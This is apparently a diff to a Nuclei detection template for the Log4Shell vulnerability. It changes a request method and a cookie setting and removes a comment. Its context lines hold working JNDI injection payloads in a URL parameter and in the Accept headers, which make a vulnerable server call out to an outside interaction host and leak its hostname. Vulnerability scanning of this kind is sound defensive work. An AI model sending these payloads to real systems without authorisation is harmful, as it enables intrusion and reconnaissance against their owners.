@@ -24,7 +24,7 @@ requests:
         GET /?x=${jndi:ldap://${hostName}.uri.{{interactsh-url}}/a} HTTP/1.1
         Host: {{Hostname}}
       - |
-        POST / HTTP/1.1
+        GET / HTTP/1.1
         Host: {{Hostname}}
         Accept: ${jndi:ldap://${hostName}.accept.{{interactsh-url}}}
         Accept-Encoding: ${jndi:ldap://${hostName}.acceptencoding.{{interactsh-url}}}
@@ -69,7 +69,7 @@ requests:
     scanMode: pitchfork
     stopAtFirstMatch: true
     matchers-condition: and
-    cookieReuse: true
+    cookieReuse: false
     matchers:
       - type: word
         part: interactsh_protocol  # Confirms the DNS Interaction
@@ -97,5 +97,3 @@ requests:
         group: 1
         regex:
           - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
-
-# Enhanced by mp on 2022/02/28
